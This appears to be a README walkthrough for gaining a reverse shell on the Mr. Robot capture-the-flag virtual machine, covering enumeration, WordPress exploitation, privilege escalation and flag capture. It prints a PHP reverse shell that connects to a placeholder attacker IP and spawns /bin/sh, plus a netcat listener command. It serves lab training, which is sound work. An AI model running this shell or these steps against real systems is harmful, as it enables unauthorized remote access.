# Mr-robot-reverse-shell-
"Mr. Robot VM Reverse Shell" typically refers to gaining a reverse shell on the Mr. Robot CTF virtual machine, which is a vulnerable machine hosted on Hack The Box (HTB) or VulnHub. This VM is inspired by the TV series Mr. Robot and is designed to test penetration testing skills.

Reverse Shell on Mr. Robot VM (CTF Walkthrough)

A reverse shell allows an attacker to execute commands on a target system remotely. Here’s how you typically gain a reverse shell on the Mr. Robot VM:

1. Enumeration & Discovery

Use Nmap to scan for open ports:

nmap -sC -sV -A <target_IP>

Common open ports on the Mr. Robot VM:

80 (HTTP) – Hosts a website.

443 (HTTPS)

TCP/22 (SSH, may not be enabled initially)



2. Web Exploitation

Visit http://<target_IP> in a browser.

Identify robots.txt, which contains a hidden key and potential directories.

Find a WordPress site running on the server.

Use WPScan to enumerate users and plugins:

wpscan --url http://<target_IP> --enumerate u,p

The username "Elliot" is commonly found.


3. Exploiting WordPress

Use WordPress vulnerabilities (such as outdated plugins) to gain access.

If WP Admin credentials are found, upload a malicious PHP reverse shell using a plugin or theme editor.


4. Reverse Shell Execution

Use a Pentestmonkey PHP Reverse Shell:

<?php
$sock=fsockopen("YOUR_IP",4444);
$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>

Start a Netcat listener on your Kali machine:

nc -lvnp 4444

Access the shell by executing the uploaded PHP file.


5. Privilege Escalation

Check the system:

uname -a

Locate SUID binaries:

find / -perm -u=s -type f 2>/dev/null

Search for password hashes in /home/robot and use John the Ripper to crack them.

Use the cracked credentials to escalate privileges (e.g., switching to the "robot" user).

Use sudo privileges or kernel exploits to gain root access.


6. Capture the Flags

The final flag is usually in /root/ after gaining full access.


Would you like a step-by-step detailed guide with specific commands?

